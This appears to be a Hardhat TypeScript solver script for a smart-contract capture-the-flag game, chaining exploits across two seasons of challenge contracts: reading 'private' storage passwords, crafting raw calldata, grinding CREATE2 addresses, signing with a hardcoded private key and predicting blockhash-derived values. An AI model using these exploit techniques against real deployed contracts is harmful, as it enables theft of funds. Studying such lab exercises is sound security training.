/* eslint-disable no-console, @typescript-eslint/no-explicit-any */
import { ethers, deployments, network } from "hardhat";

const ACCOUNT12_PK = "0xa267530f49f8280200edf313ee7af6b827f2a8bce2897751d06a843f644967b1";
const abi = ethers.AbiCoder.defaultAbiCoder();
const ONE = 10n ** 18n;

const results: { id: string; ok: boolean; note: string }[] = [];
function rec(id: string, ok: boolean, note = "") {
  results.push({ id, ok, note });
  console.log(`${ok ? "OK  " : "FAIL"} ${id}${note ? " :: " + note : ""}`);
}
function errStr(e: any): string {
  return [e?.reason, e?.shortMessage, e?.message, e?.info?.error?.message].filter(Boolean).join(" | ");
}
async function addr(name: string): Promise<string> {
  return (await deployments.get(name)).address;
}
async function at(name: string, signer?: any): Promise<any> {
  return ethers.getContractAt(name, await addr(name), signer);
}
function q(hex: string): string {
  let s = hex.replace(/^0x/, "").replace(/^0+/, "");
  if (s.length === 0) return "0x";
  if (s.length % 2 === 1) s = "0" + s;
  return "0x" + s;
}
function rlpHeader(b: any): string {
  return ethers.encodeRlp([
    b.parentHash,
    b.sha3Uncles,
    b.miner,
    b.stateRoot,
    b.transactionsRoot,
    b.receiptsRoot,
    b.logsBloom,
    q(b.difficulty),
    q(b.number),
    q(b.gasLimit),
    q(b.gasUsed),
    q(b.timestamp),
    b.extraData,
    b.mixHash,
    b.nonce,
    q(b.baseFeePerGas),
    b.withdrawalsRoot,
    q(b.blobGasUsed),
    q(b.excessBlobGas),
    b.parentBeaconBlockRoot,
  ]);
}
async function blockAt(n: number): Promise<any> {
  return ethers.provider.send("eth_getBlockByNumber", ["0x" + n.toString(16), false]);
}
async function mine(n: number) {
  for (let i = 0; i < n; i++) await network.provider.send("evm_mine", []);
}
async function deploy(name: string, args: any[] = [], value?: bigint): Promise<any> {
  const f = await ethers.getContractFactory(name);
  const c = await (value !== undefined ? f.deploy(...args, { value }) : f.deploy(...args));
  await c.waitForDeployment();
  return c;
}

async function main() {
  const [player] = await ethers.getSigners();
  const playerAddr = await player.getAddress();
  const provider = ethers.provider;
  const w12 = new ethers.Wallet(ACCOUNT12_PK, provider);
  const w12Addr = w12.address;
  const s1f: any = await at("Season1NFTFlags", player);
  const s2f: any = await at("Season2NFTFlags", player);
  const done = async (f: any, id: number) => await f.hasMinted(playerAddr, id);
  console.log("player", playerAddr, "block", await provider.getBlockNumber());

  const S = (n: string) => `Season1Challenge${n}`;
  const T = (n: string) => `Season2Challenge${n}`;

  // ============ SEASON 1 ============
  // 1
  try {
    if (!(await done(s1f, 1))) {
      const c: any = await at(S("1"), player);
      await (await c.registerMe("blockdns")).wait();
    }
    rec("S1Ch1", true);
  } catch (e) {
    rec("S1Ch1", false, errStr(e).slice(0, 160));
  }

  // 2
  try {
    if (!(await done(s1f, 2))) {
      const c: any = await at(S("2"), player);
      const s: any = await deploy("S1Ch2Solver");
      await (await s.attack(await c.getAddress())).wait();
    }
    rec("S1Ch2", true);
  } catch (e) {
    rec("S1Ch2", false, errStr(e).slice(0, 160));
  }

  // 3
  try {
    if (!(await done(s1f, 3))) {
      const c: any = await at(S("3"), player);
      await deploy("S1Ch3Solver", [await c.getAddress()]);
    }
    rec("S1Ch3", true);
  } catch (e) {
    rec("S1Ch3", false, errStr(e).slice(0, 160));
  }

  // 4
  try {
    if (!(await done(s1f, 4))) {
      const c: any = await at(S("4"), player);
      const msg = ethers.keccak256(abi.encode(["string", "address"], ["BG CTF Challenge 4", playerAddr]));
      const sig = await w12.signMessage(ethers.getBytes(msg));
      await (await c.mintFlag(w12Addr, sig)).wait();
    }
    rec("S1Ch4", true);
  } catch (e) {
    rec("S1Ch4", false, errStr(e).slice(0, 160));
  }

  // 5
  try {
    if (!(await done(s1f, 5))) {
      const c: any = await at(S("5"), player);
      const s: any = await deploy("S1Ch5Solver", [await c.getAddress()]);
      await (await s.attack()).wait();
    }
    rec("S1Ch5", true);
  } catch (e) {
    rec("S1Ch5", false, errStr(e).slice(0, 160));
  }

  // 6
  try {
    if (!(await done(s1f, 6))) {
      const c: any = await at(S("6"), player);
      const cAddr = await c.getAddress();
      const s: any = await deploy("S1Ch6Solver");
      const count = await c.count();
      const code = count << 8n;
      let chosen = -1n;
      let chosenGas = 0;
      for (let g = 150000; g <= 400000; g += 1000) {
        let ok = false;
        try {
          await s.attack.staticCall(cAddr, code, BigInt(g));
          ok = true;
        } catch (e) {
          const str = errStr(e);
          const m = str.match(/Wrong gas:\s*(\d+)/);
          if (m) {
            const gl = BigInt(m[1]);
            if (gl > 190000n && gl < 200000n) {
              chosen = gl;
              chosenGas = g;
              break;
            }
          }
        }
        if (ok) {
          chosenGas = g;
          break;
        }
      }
      if (chosenGas === 0) throw new Error("no gas found");
      await (await s.attack(cAddr, code, BigInt(chosenGas), { gasLimit: 800000 })).wait();
    }
    rec("S1Ch6", true);
  } catch (e) {
    rec("S1Ch6", false, errStr(e).slice(0, 160));
  }

  // 7
  try {
    if (!(await done(s1f, 7))) {
      const c7Addr = await addr(S("7"));
      await (await player.sendTransaction({ to: c7Addr, data: ethers.id("claimOwnership()").slice(0, 10) })).wait();
      const c: any = await at(S("7"), player);
      await (await c.mintFlag()).wait();
    }
    rec("S1Ch7", true);
  } catch (e) {
    rec("S1Ch7", false, errStr(e).slice(0, 160));
  }

  // 8 (bytecode only)
  try {
    if (!(await done(s1f, 8))) {
      const c8Addr = await addr(S("8"));
      const data = "0x8fd628f0" + ethers.zeroPadValue(playerAddr, 32).slice(2);
      await (await player.sendTransaction({ to: c8Addr, data })).wait();
    }
    rec("S1Ch8", true);
  } catch (e) {
    rec("S1Ch8", false, errStr(e).slice(0, 160));
  }

  // 9
  try {
    if (!(await done(s1f, 9))) {
      const c: any = await at(S("9"), player);
      const pw = await provider.getStorage(await c.getAddress(), 1);
      const masked = "0x" + (BigInt(pw) & ((1n << 248n) - 1n)).toString(16).padStart(64, "0");
      await (await c.mintFlag(masked)).wait();
    }
    rec("S1Ch9", true);
  } catch (e) {
    rec("S1Ch9", false, errStr(e).slice(0, 160));
  }

  // 10 (no contract; use NFTFlags receiver)
  try {
    if (!(await done(s1f, 10))) {
      const cnt = await s1f.tokenIdCounter();
      let t1 = 0n,
        t9 = 0n;
      for (let i = 1n; i <= cnt; i++) {
        const owner = await s1f.ownerOf(i);
        if (owner.toLowerCase() !== playerAddr.toLowerCase()) continue;
        const cid = await s1f.tokenIdToChallengeId(i);
        if (cid === 1n) t1 = i;
        if (cid === 9n) t9 = i;
      }
      if (!t1 || !t9) throw new Error(`missing t1=${t1} t9=${t9}`);
      const data = abi.encode(["uint256"], [t9]);
      await (await s1f["safeTransferFrom(address,address,uint256,bytes)"](playerAddr, await s1f.getAddress(), t1, data)).wait();
    }
    rec("S1Ch10", true);
  } catch (e) {
    rec("S1Ch10", false, errStr(e).slice(0, 160));
  }

  // 11 (CREATE2 grind)
  try {
    if (!(await done(s1f, 11))) {
      const c11Addr = await addr(S("11"));
      const solverAddr = await create2Matching(playerAddr, (a: string) => {
        const last = parseInt(a.slice(-2), 16);
        const pl = parseInt(playerAddr.slice(-2), 16);
        return (last & 0x15) === (pl & 0x15);
      });
      const cs: any = new ethers.Contract(solverAddr, (await ethers.getContractFactory("CallerSolver")).interface, player);
      await (await cs.attack(c11Addr)).wait();
    }
    rec("S1Ch11", true);
  } catch (e) {
    rec("S1Ch11", false, errStr(e).slice(0, 160));
  }

  // 12 (RLP header)
  try {
    if (!(await done(s1f, 12))) {
      const c: any = await at(S("12"), player);
      await (await c.preMintFlag()).wait();
      const pre = await provider.getBlockNumber();
      await mine(2);
      const blk = await blockAt(pre + 2);
      const rlp = rlpHeader(blk);
      if (ethers.keccak256(rlp) !== blk.hash) throw new Error("header mismatch");
      await (await c.mintFlag(rlp)).wait();
    }
    rec("S1Ch12", true);
  } catch (e) {
    rec("S1Ch12", false, errStr(e).slice(0, 160));
  }

  // ============ SEASON 2 ============
  // 2
  try {
    if (!(await done(s2f, 2))) {
      const c2Addr = await addr(T("2"));
      const c: any = await at(T("2"), player);
      const key = ethers.solidityPackedKeccak256(["address", "address"], [playerAddr, c2Addr]);
      await (await c.mintFlag(key)).wait();
    }
    rec("S2Ch2", true);
  } catch (e) {
    rec("S2Ch2", false, errStr(e).slice(0, 160));
  }

  // 3
  try {
    if (!(await done(s2f, 3))) {
      const c: any = await at(T("3"), player);
      const s: any = await deploy("S2Ch3Solver");
      await (await s.attack(await c.getAddress())).wait();
    }
    rec("S2Ch3", true);
  } catch (e) {
    rec("S2Ch3", false, errStr(e).slice(0, 160));
  }

  // 4
  try {
    if (!(await done(s2f, 4))) {
      const c: any = await at(T("4"), player);
      const s: any = await deploy("S2Ch4Solver", [await c.getAddress()], ethers.parseEther("0.001"));
      await (await s.attack()).wait();
    }
    rec("S2Ch4", true);
  } catch (e) {
    rec("S2Ch4", false, errStr(e).slice(0, 160));
  }

  // 5 (memory mload)
  try {
    if (!(await done(s2f, 5))) {
      const c: any = await at(T("5"), player);
      const counter = await s2f.tokenIdCounter();
      const data1 = [0n, 0n, 0n, 0n, 0n, 0n, counter << 128n];
      const data2 = new Array(Number(counter % 128n)).fill(0n);
      await (await c.mintFlag(data1, data2)).wait();
    }
    rec("S2Ch5", true);
  } catch (e) {
    rec("S2Ch5", false, errStr(e).slice(0, 160));
  }

  // 6
  try {
    if (!(await done(s2f, 6))) {
      const c: any = await at(T("6"), player);
      const s: any = await deploy("S2Ch6Solver", [await c.getAddress()]);
      await (await s.attack()).wait();
    }
    rec("S2Ch6", true);
  } catch (e) {
    rec("S2Ch6", false, errStr(e).slice(0, 160));
  }

  // 7 (raw calldata trick)
  try {
    if (!(await done(s2f, 7))) {
      const c7Addr = await addr(T("7"));
      const mintBytesSel = ethers.id("mint(bytes)").slice(0, 10);
      const allowSel = ethers.id("allowMinter()").slice(0, 10);
      const mintFlagSel = ethers.id("mintFlag()").slice(0, 10);
      const w = (v: bigint | string) => BigInt(v).toString(16).padStart(64, "0");
      // crafted: offset=124 (abs 128); byte 68..72 = mintFlag selector; bytes arg = allowMinter()
      let d = "0x" + mintBytesSel.slice(2) + w(124n) + w(0n) + mintFlagSel.slice(2) + "0".repeat(112) + w(4n) + allowSel.slice(2);
      await (await player.sendTransaction({ to: c7Addr, data: d })).wait();
      const d2 = "0x" + mintBytesSel.slice(2) + w(0x20n) + w(4n) + mintFlagSel.slice(2);
      await (await player.sendTransaction({ to: c7Addr, data: d2 })).wait();
    }
    rec("S2Ch7", true);
  } catch (e) {
    rec("S2Ch7", false, errStr(e).slice(0, 160));
  }

  // 8
  try {
    if (!(await done(s2f, 8))) {
      const c8Addr = await addr(T("8"));
      const c: any = await at(T("8"), player);
      const pw = await provider.getStorage(c8Addr, 1);
      const masked = "0x" + (BigInt(pw) & ((1n << 248n) - 1n)).toString(16).padStart(64, "0");
      const s: any = await deploy("S2Ch8Solver", [c8Addr], ethers.parseEther("1"));
      await (await s.attack(masked)).wait();
    }
    rec("S2Ch8", true);
  } catch (e) {
    rec("S2Ch8", false, errStr(e).slice(0, 160));
  }

  // 9 (bytecode-only signature)
  try {
    if (!(await done(s2f, 9))) {
      const c9Addr = await addr(T("9"));
      const msg = ethers.keccak256(abi.encode(["string", "address"], ["BG CTF Challenge 9", playerAddr]));
      const sig = await w12.signMessage(ethers.getBytes(msg));
      const data = "0x23cfec7e" + abi.encode(["address", "bytes"], [w12Addr, sig]).slice(2);
      await (await player.sendTransaction({ to: c9Addr, data })).wait();
    }
    rec("S2Ch9", true);
  } catch (e) {
    rec("S2Ch9", false, errStr(e).slice(0, 160));
  }

  // 10 (CREATE2 grind)
  try {
    if (!(await done(s2f, 10))) {
      const c10Addr = await addr(T("10"));
      const c10First = parseInt(c10Addr.slice(2, 4), 16);
      const solverAddr = await create2Matching(playerAddr, (a: string) => {
        const last = parseInt(a.slice(-2), 16);
        const pl = parseInt(playerAddr.slice(-2), 16);
        const first = parseInt(a.slice(2, 4), 16);
        return (last & 0xf) === (pl & 0xf) && (first & 0xf0) === (c10First & 0xf0);
      });
      const cs: any = new ethers.Contract(solverAddr, (await ethers.getContractFactory("CallerSolver")).interface, player);
      await (await cs.attack(c10Addr)).wait();
    }
    rec("S2Ch10", true);
  } catch (e) {
    rec("S2Ch10", false, errStr(e).slice(0, 160));
  }

  // 11 (10 premints + RLP)
  try {
    if (!(await done(s2f, 11))) {
      const c: any = await at(T("11"), player);
      for (let i = 0; i < 10; i++) await (await c.preMintFlag()).wait();
      const last = await provider.getBlockNumber();
      await mine(2);
      const blk = await blockAt(last + 2);
      const rlp = rlpHeader(blk);
      if (ethers.keccak256(rlp) !== blk.hash) throw new Error("header mismatch");
      await (await c.mintFlag(rlp)).wait();
    }
    rec("S2Ch11", true);
  } catch (e) {
    rec("S2Ch11", false, errStr(e).slice(0, 160));
  }

  // 12 (boss)
  try {
    if (!(await done(s2f, 12))) {
      await solveCh12(player, playerAddr, s2f, w12);
    }
    rec("S2Ch12", true);
  } catch (e) {
    rec("S2Ch12", false, errStr(e).slice(0, 300));
  }

  console.log("\n=== SUMMARY ===");
  const okc = results.filter(r => r.ok).length;
  console.log(`${okc}/${results.length} solved`);
  console.log("FLAGS_" + JSON.stringify(results.filter(r => !r.ok).map(r => r.id)));
  process.exit(0);
}

async function create2Matching(playerAddr: string, ok: (a: string) => boolean): Promise<string> {
  const factory: any = await deploy("Create2Factory");
  const fAddr = await factory.getAddress();
  const cf = await ethers.getContractFactory("CallerSolver");
  const bytecode = cf.bytecode;
  const initHash = ethers.keccak256(bytecode);
  for (let i = 0; i < 200000; i++) {
    const salt = ethers.zeroPadValue(ethers.toBeHex(i, 32), 32);
    const a = ethers.getCreate2Address(fAddr, salt, initHash);
    if (ok(a)) {
      await (await factory.deploy(salt, bytecode)).wait();
      return a;
    }
  }
  throw new Error("no create2 match");
}

async function solveCh12(player: any, playerAddr: string, s2f: any, w12: ethers.Wallet) {
  const V = 50n * ONE;
  const heroAddr = await addr("Season2Challenge12HeroNFT");
  const goldAddr = await addr("Season2Challenge12GoldToken");
  const invAddr = await addr("Season2Challenge12Inventory");
  const questAddr = await addr("Season2Challenge12Quest");
  const dungeonAddr = await addr("Season2Challenge12Dungeon");
  const victoryAddr = await addr("Season2Challenge12Victory");
  const c12Addr = await addr("Season2Challenge12");
  const hero: any = await ethers.getContractAt("Season2Challenge12HeroNFT", heroAddr, player);
  const gold: any = await ethers.getContractAt("Season2Challenge12GoldToken", goldAddr, player);
  const quest: any = await ethers.getContractAt("Season2Challenge12Quest", questAddr, player);
  const dungeon: any = await ethers.getContractAt("Season2Challenge12Dungeon", dungeonAddr, player);
  const victory: any = await ethers.getContractAt("Season2Challenge12Victory", victoryAddr, player);

  const mask160 = (1n << 160n) - 1n;
  const enemy = "0x" + (BigInt(playerAddr) ^ mask160).toString(16).padStart(40, "0");

  const solver: any = await deploy("S2Ch12Solver", [heroAddr, goldAddr, c12Addr, dungeonAddr, questAddr, victoryAddr]);
  const solverAddr = await solver.getAddress();

  // claim gold: need a challengeId==2 season2 token (owned) and another owned unclaimed token
  const cnt = await s2f.tokenIdCounter();
  let t2 = 0n;
  let other = 0n;
  for (let i = 1n; i <= cnt; i++) {
    const cid = await s2f.tokenIdToChallengeId(i);
    const owner = (await s2f.ownerOf(i)).toLowerCase();
    if (owner !== playerAddr.toLowerCase()) continue;
    if (cid === 2n) t2 = i;
    else if (!(await s2f.tokensClaimed(i))) other = i;
  }
  if (!t2 || !other) throw new Error(`gold setup: t2=${t2} other=${other}`);
  const claimData = abi.encode(["uint256"], [t2]);
  await (await s2f["safeTransferFrom(address,address,uint256,bytes)"](playerAddr, await s2f.getAddress(), other, claimData)).wait();

  const M0 = await gold.balanceOf(playerAddr);
  if (M0 < 3n * ONE) throw new Error("not enough gold " + M0);

  // let the solver move the player's gold
  await (await gold.approve(solverAddr, M0)).wait();

  // pick uri (chars '5'..'9' => stringToUint digits 0..4) and derive the solver's target balance
  // from the blockhash that mintFlag will read (the block right before the solve tx)
  const tip = await ethers.provider.send("eth_getBlockByNumber", ["latest", false]);
  const BH = tip.hash;
  let uri = "";
  let iv = 0n;
  let B = 0n;
  for (let n = 0; n < 200000; n++) {
    let s = "";
    for (let k = 0; k < 40; k++) s += String.fromCharCode(53 + Math.floor(Math.random() * 5));
    let val = 0n;
    for (const ch of s) val = val * 10n + BigInt(ch.charCodeAt(0) - 0x35);
    const h = BigInt(ethers.solidityPackedKeccak256(["bytes32", "address", "uint256"], [BH, c12Addr, val]));
    const b = h % (100n * ONE);
    if (b >= 2n && b + 3n * ONE <= M0) {
      uri = s;
      iv = val;
      B = b;
      break;
    }
  }
  if (!uri) throw new Error("no uri found");

  // single tx: nothing mines in between, so blockhash(block.number-1) == BH at execution
  const bBytes = ethers.zeroPadValue(ethers.toBeHex(B), 32);
  await (await solver.solveAll(bBytes, uri, iv + ONE, enemy, { gasLimit: 3000000 })).wait();
}

main().catch(e => {
  console.log("FATAL", errStr(e));
  process.exit(1);
});
